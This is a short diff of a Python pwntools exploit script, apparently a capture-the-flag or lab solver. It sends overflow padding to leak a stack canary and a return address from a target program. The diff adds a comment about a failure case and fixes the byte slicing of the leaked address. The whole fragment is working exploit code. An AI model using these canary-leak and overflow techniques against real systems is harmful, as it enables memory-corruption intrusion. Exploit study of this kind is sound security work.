@@ -15,6 +15,7 @@ def solve(r: remote, data: bytes):
     # leak the canary value
     # NOTE: the first byte of canary values is always 0x0
     # So, we don't minus one to consider the newline.
+    # NOTE: If the later bytes have 0x0, it is still failed. But the number of inputs is only 3, we cannot solve it.
     msg = b"A" * (OFFSET_BUF1_TO_RBP - OFFSET_CANARY_TO_RBP)
     r.sendline(msg)
     canary_bytes = b"\x00" + r.recvlinesb(2)[1][:7]
@@ -26,7 +27,7 @@ def solve(r: remote, data: bytes):
     # leak the return address
     msg = b"A" * (OFFSET_BUF2_TO_RBP + OFFSET_RBP_TO_RETURN_ADDR - 1)
     r.sendline(msg)
-    ret_addr = int.from_bytes(r.recvlinesb(2)[1], byteorder="little")
+    ret_addr = int.from_bytes(r.recvlinesb(2)[1][:8], byteorder="little")
     print(f"original return address: 0x{ret_addr:x}")
 
     r.recvuntil(b"What's the customer's name? ")
